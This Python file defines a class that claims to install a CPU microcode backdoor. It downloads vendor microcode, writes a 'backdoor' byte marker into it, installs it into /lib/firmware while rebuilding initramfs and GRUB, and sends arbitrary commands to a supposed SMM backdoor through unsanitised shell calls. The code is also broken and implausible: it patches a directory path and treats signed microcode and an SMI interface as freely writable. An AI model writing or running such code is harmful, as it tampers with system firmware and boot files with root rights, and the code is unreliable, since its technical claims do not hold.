import os
import subprocess
import struct

class CPUMicrocode:
    def __init__(self):
        self.cpu_vendor = self.detect_cpu_vendor()
    
    def detect_cpu_vendor(self):
        try:
            with open("/proc/cpuinfo", 'r') as f:
                for line in f:
                    if "vendor_id" in line:
                        return line.split(":")[1].strip()
        except:
            return "Unknown"
        return "Unknown"
    
    def get_microcode_version(self):
        try:
            with open("/proc/cpuinfo", 'r') as f:
                for line in f:
                    if "microcode" in line:
                        return line.split(":")[1].strip()
        except:
            pass
        return "Unknown"
    
    def download_microcode_update(self):
        if "Intel" in self.cpu_vendor:
            os.system("wget https://downloadmirror.intel.com/27487/eng/microcode-20210608.tgz -O /tmp/microcode.tgz")
        elif "AMD" in self.cpu_vendor:
            os.system("wget https://www.amd.com/system/files/TechDocs/amd-microcode-20210524.tgz -O /tmp/microcode.tgz")
        os.system("tar -xzf /tmp/microcode.tgz -C /tmp/")
        return "/tmp/microcode"
    
    def patch_microcode(self, microcode_file):
        with open(microcode_file, 'rb') as f:
            data = bytearray(f.read())
        
        backdoor = b"DEADBEEF12345678"
        data[48:48+len(backdoor)] = backdoor
        
        patched_file = "/tmp/microcode_patched.bin"
        with open(patched_file, 'wb') as f:
            f.write(data)
        return patched_file
    
    def load_microcode(self, microcode_file):
        os.system(f"cp {microcode_file} /lib/firmware/")
        os.system("update-initramfs -u")
        os.system("update-grub")
        return "Microcode installed! Reboot required."
    
    def trigger_smm_backdoor(self, command):
        os.system(f"echo {command} > /proc/acpi/smi")
        return f"Command {command} sent to SMM backdoor!"
    
    def install_cpu_backdoor(self):
        result = f"CPU Vendor: {self.cpu_vendor}\n"
        result += f"Current Microcode: {self.get_microcode_version()}\n"
        microcode = self.download_microcode_update()
        patched = self.patch_microcode(microcode)
        result += "Microcode patched!\n"
        result += self.load_microcode(patched) + "\n"
        return result